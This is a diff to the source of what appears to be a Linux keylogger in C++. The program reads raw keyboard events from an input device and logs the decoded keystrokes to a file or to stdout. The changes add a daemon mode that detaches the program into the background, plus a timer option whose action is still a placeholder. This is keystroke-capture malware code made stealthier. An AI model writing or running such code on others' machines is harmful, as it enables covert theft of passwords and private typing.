@@ -12,6 +12,11 @@
 //main
 int main(int argc, char **argv)
 {
+    //if(processAlreadyRunning())
+    //{
+        //std::cout << "The process is already running" << std::endl;
+        //exit(EXIT_SUCCESS);
+    //}
     int kbd_Fd;
 
     input_event eve;
@@ -57,6 +62,16 @@ int main(int argc, char **argv)
     if(!fleObj.is_open() && isFile)
         throw std::runtime_error("Error while opening the given log file");
 
+    int timeInterval = 4;
+    if(args >> GetOpt::OptionPresent('t', "time"))
+    {
+        args >> GetOpt::Option('t', "time", timeInterval, 4);
+    }
+    TimerUnit timeController(timeInterval);
+    if(!isStdOut)
+        if(daemon(1, 1) != 0)
+            throw std::runtime_error("Unable to initialize the daemon");
+
     while(read(kbd_Fd, &eve, sizeof(input_event)) > 0)
     {
         if(eve.type == EV_KEY)
@@ -77,6 +92,9 @@ int main(int argc, char **argv)
             std::cout << keyWord << std::endl;
         if(isFile && eve.value == KEY_PRESS && eve.type == EV_KEY)
             fleObj << keyWord;
+
+        if(timeController.checkTime())
+            ;//do something
     }
     close(kbd_Fd);
     fleObj.close();
